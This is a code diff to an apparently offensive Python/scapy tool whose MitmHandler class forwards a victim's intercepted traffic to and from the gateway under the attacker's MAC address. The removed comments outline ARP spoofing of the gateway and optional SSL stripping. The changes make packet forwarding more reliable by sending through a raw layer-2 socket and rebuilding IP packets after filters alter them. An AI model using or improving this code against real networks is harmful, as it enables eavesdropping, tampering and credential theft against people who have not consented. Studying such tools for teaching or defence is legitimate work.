@@ -1,11 +1,3 @@
-# Spoof gateway
-# Listen for request from client
-# do either ARP if server on local network, otherwise gateway is already spoofed
-# Complete tcp handshake
-# Wait for http
-# If ssl stripping, start http connection using ssl stripping
-# If not, just start https connection
-
 import scapy.all as sc
 import threading
 from scapy.layers.inet import IP, TCP, UDP
@@ -27,6 +19,11 @@ class MitmHandler:
         self.running = False
         self.logger = logger
         self.filters = []
+        # Create a raw socket for sending to avoid scapy overhead/bugs in crucial forwarding path
+        try:
+            self.raw_socket = sc.conf.L2socket(iface=self.interface)
+        except:
+            self.raw_socket = None
 
     def add_filter(self, filter_handler):
         self.filters.append(filter_handler)
@@ -78,6 +75,7 @@ class MitmHandler:
         if not packet.haslayer(IP):
             return
         ip = packet[IP]
+
         if ip.src == self.attacker_ip:
             return
         if packet.haslayer(Ether) and packet[Ether].src == self.attacker_mac:
@@ -101,41 +99,46 @@ class MitmHandler:
             if not packet.haslayer(IP):
                 return
 
-            ip_pkt = packet[IP].copy()
+            # Robust handling: Force full reconstruction of the IP layer
+            # This handles cases where in-place modification left the packet in a weird state
+            # or where Scapy returned raw bytes for the layer.
+            try:
+                # We serialize the IP layer (bytes(...)) to commit any changes made by filters
+                # Then we deserialize (IP(...)) to get a fresh, clean packet object with correct checksums/lengths
+                ip_layer_obj = packet[IP]
+                current_ip_bytes = bytes(ip_layer_obj)
+                ip_pkt = IP(current_ip_bytes)
+            except Exception:
+                # If basic extraction fails, ignore packet
+                return
 
-            # Clear checksums / length
-            del ip_pkt.len
-            del ip_pkt.chksum
-
-            if ip_pkt.haslayer(TCP):
-                del ip_pkt[TCP].chksum
-            if ip_pkt.haslayer(UDP):
-                del ip_pkt[UDP].chksum
-
-            # From victim to gateway
+            # Direction logic
             if ip_pkt.src == self.victim_ip:
-                ether = Ether(
-                    src=self.attacker_mac,
-                    dst=self.gateway_mac
-                )
-
-            # From gateway to victim
+                # Traffic from Victim -> Server
+                ether = Ether(src=self.attacker_mac, dst=self.gateway_mac)
+                if self.logger: self.logger(f"[MITM] Forwarding Victim({ip_pkt.src}) -> Server({ip_pkt.dst}) via {self.gateway_mac}")
+            
             elif ip_pkt.dst == self.victim_ip:
-                ether = Ether(
-                    src=self.attacker_mac,
-                    dst=self.victim_mac
-                )
+                 # Traffic from Server -> Victim
+                ether = Ether(src=self.attacker_mac, dst=self.victim_mac)
+                if self.logger: self.logger(f"[MITM] Forwarding Server({ip_pkt.src}) -> Victim({ip_pkt.dst}) via {self.victim_mac}")
             else:
                 return
 
-            frags = sc.fragment(ip_pkt, fragsize=1480)
+            # Clean checksums just in case force-recalc is needed again
+            del ip_pkt.chksum
+            if ip_pkt.haslayer(TCP): del ip_pkt[TCP].chksum
+            if ip_pkt.haslayer(UDP): del ip_pkt[UDP].chksum
 
-            for frag in frags:
-                sc.sendp(
-                    ether / frag,
-                    iface=self.interface,
-                    verbose=False
-                )
+            # Send without fragmentation for small redirects (Redirects are usually < 500 bytes)
+            # Fragmentation can sometimes cause issues if not strictly needed
+            
+            # Use raw socket if available for speed/reliability
+            final_pkt = ether / ip_pkt
+            if self.raw_socket:
+                self.raw_socket.send(final_pkt)
+            else:
+                sc.sendp(final_pkt, iface=self.interface, verbose=False)
 
         except Exception as e:
             self.logger(f"MITM Handler exception: {e}")
